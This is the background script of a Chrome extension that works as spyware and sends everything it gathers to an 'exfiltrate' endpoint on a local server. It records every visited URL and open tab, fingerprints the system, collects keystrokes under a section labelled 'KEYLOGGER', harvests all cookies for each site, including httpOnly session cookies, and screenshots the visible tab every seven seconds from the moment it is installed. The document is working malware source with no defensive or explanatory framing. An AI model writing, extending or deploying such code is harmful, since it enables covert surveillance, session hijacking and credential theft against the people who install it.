// Function to send a stuff to the server
function sendToServer(type, results) {
  fetch("http://localhost:3000/exfiltrate", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ type: type, data: results }),
    })
    .then((response) => {
      if (response.ok) {

      } else {
        console.error("Failed to send data:", results, response.statusText);
      }
    })
    .catch((error) => {
      console.error("Error sending data:", results, error);
    });
}

/**********************

       URLS STUFF

************************/


chrome.webRequest.onBeforeRequest.addListener(
    function (details) {
        //if (!details.initiator && !url.startsWith('http://localhost')) {  // the user made the request, not resources
        if (details.type==='main_frame' && !details.url.startsWith("http://localhost")){
            // remove !details.initiator to get resources as well.
            sendToServer("urls", details.url);
       }
    },
    { urls: ["http://*/*", "https://*/*"] }
);


chrome.tabs.query({}, (tabs) => {
  tabs.forEach((tab) => {
    if (tab.url) {
      sendToServer('urls', tab.url);
    }
  });
});

//chrome.tabs.onCreated.addListener((tab) => {
//  if (tab.url) {
//    sendToServer('urls', tab.url);
//  }
//});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    sendToServer('urls', tab.url);
  }
});






/**********************

       OS STUFF

************************/

function detectOS() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Windows")) {
        return "Windows";
    } else if (userAgent.includes("Mac")) {
        return "MacOS";
    } else if (userAgent.includes("Linux")) {
        return "Linux";
    } else if (userAgent.includes("Android")) {
        return "Android";
    } else if (userAgent.includes("iOS")) {
        return "iOS";
    } else {
        return "Unknown OS";
    }
}

function detectDeviceType() {
    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    return isMobile ? "Mobile" : "Desktop";
}

function detectBrowser() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Firefox")) {
        return "Mozilla Firefox";
    } else if (userAgent.includes("Edg")) {
        return "Microsoft Edge";
    } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
        return "Google Chrome";
    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
        return "Apple Safari";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        return "Opera";
    } else {
        return "Unknown Browser";
    }
}

function collectSystemInfo() {
    const systemInfo = {
        os: detectOS(),
        deviceType: detectDeviceType(),
        browser: detectBrowser(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    sendToServer('os', systemInfo);
}

collectSystemInfo();


/**********************

       KEYLOGGER STUFF (KEPT)

************************/

let keystrokeData = new Map();
let keystrokeTimeouts = new Map(); // Store timeouts per URL

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "keystroke") {
        const { url, text, timestamp } = message;

        if (!keystrokeData.has(url)) {
            keystrokeData.set(url, []);
        }

        if (keystrokeTimeouts.has(url)) {
            clearTimeout(keystrokeTimeouts.get(url));
        }

        const timeout = setTimeout(() => {
            keystrokeData.get(url).push({ text, timestamp });

            // Reinsert the URL entry to move it to the end
            const updatedEntry = [url, keystrokeData.get(url)];
            keystrokeData.delete(url); // Remove old position
            keystrokeData.set(url, updatedEntry[1]); // Reinsert to maintain order

            sendToServer("keys", Object.fromEntries(keystrokeData));

            keystrokeTimeouts.delete(url);
        }, 3000);

        keystrokeTimeouts.set(url, timeout);
    }
});


/**********************

   COOKIE HARVESTING STUFF (ADDED)

************************/

// Function to harvest cookies from the current tab
function harvestCookies(tabId, tabUrl) {
    if (!tabUrl || tabUrl.startsWith("http://localhost")) {
        return;
    }

    chrome.cookies.getAll({ url: tabUrl }, function(cookies) {
        if (chrome.runtime.lastError) {
            console.error("Error getting cookies:", chrome.runtime.lastError);
            return;
        }

        if (cookies && cookies.length > 0) {
            // Format cookies for sending
            const cookieData = {
                url: tabUrl,
                cookies: cookies.map(cookie => ({
                    name: cookie.name,
                    value: cookie.value,
                    domain: cookie.domain,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    session: cookie.session,
                    expirationDate: cookie.expirationDate
                }))
            };

            sendToServer('cookies', cookieData);
            console.log(`Cookies harvested from ${tabUrl}`);
        }
    });
}

// Harvest cookies when a tab is updated (navigates to a new page)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        harvestCookies(tabId, tab.url);
    }
});

// Harvest cookies when a tab is activated (user switches to a tab)
chrome.tabs.onActivated.addListener((activeInfo) => {
    chrome.tabs.get(activeInfo.tabId, (tab) => {
        if (tab.url) {
            harvestCookies(tab.id, tab.url);
        }
    });
});

// Harvest cookies when a new tab is created
chrome.tabs.onCreated.addListener((tab) => {
    // Wait a bit for the tab to load
    setTimeout(() => {
        if (tab.url) {
            chrome.tabs.get(tab.id, (updatedTab) => {
                if (updatedTab.url) {
                    harvestCookies(updatedTab.id, updatedTab.url);
                }
            });
        }
    }, 2000);
});

// Harvest cookies from all existing tabs when extension starts
chrome.tabs.query({}, (tabs) => {
    tabs.forEach((tab) => {
        if (tab.url) {
            harvestCookies(tab.id, tab.url);
        }
    });
});

// Also harvest cookies when cookies change (catches new/updated cookies)
chrome.cookies.onChanged.addListener((changeInfo) => {
    const cookie = changeInfo.cookie;

    // Get the active tab to know which site we're on
    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
        if (tabs[0] && tabs[0].url && !tabs[0].url.startsWith("http://localhost")) {
            // Only send if this cookie is relevant to the current domain
            try {
                const url = new URL(tabs[0].url);
                const domain = url.hostname;

                if (cookie.domain.includes(domain) || domain.includes(cookie.domain.replace(/^\./, ''))) {
                    const cookieData = {
                        url: tabs[0].url,
                        cookies: [{
                            name: cookie.name,
                            value: cookie.value,
                            domain: cookie.domain,
                            path: cookie.path,
                            secure: cookie.secure,
                            httpOnly: cookie.httpOnly,
                            session: cookie.session,
                            expirationDate: cookie.expirationDate,
                            changeType: changeInfo.removed ? 'removed' : 'added/updated'
                        }]
                    };

                    sendToServer('cookies', cookieData);
                    console.log(`Cookie ${changeInfo.removed ? 'removed' : 'updated'} on ${tabs[0].url}`);
                }
            } catch (e) {
                // Invalid URL, ignore
            }
        }
    });
});

/**********************

       Screen Capture Stuff (KEPT)

************************/

let intervalId = null;

function startScreenshotLoop() {
    if (!intervalId) {
        intervalId = setInterval(() => {
            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
                if (chrome.runtime.lastError) {
                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
                } else {
                    sendToServer("screenshot", imageUri);
                }
            });
        }, 7000);
    }
}

function downloadScreenshot(imageUri) {
    const filename = `screenshot_${Date.now()}.png`;
    chrome.downloads.download({
        url: imageUri,
        filename: filename
    });
}

chrome.runtime.onStartup.addListener(startScreenshotLoop);
chrome.runtime.onInstalled.addListener(startScreenshotLoop);

chrome.tabs.onActivated.addListener(startScreenshotLoop);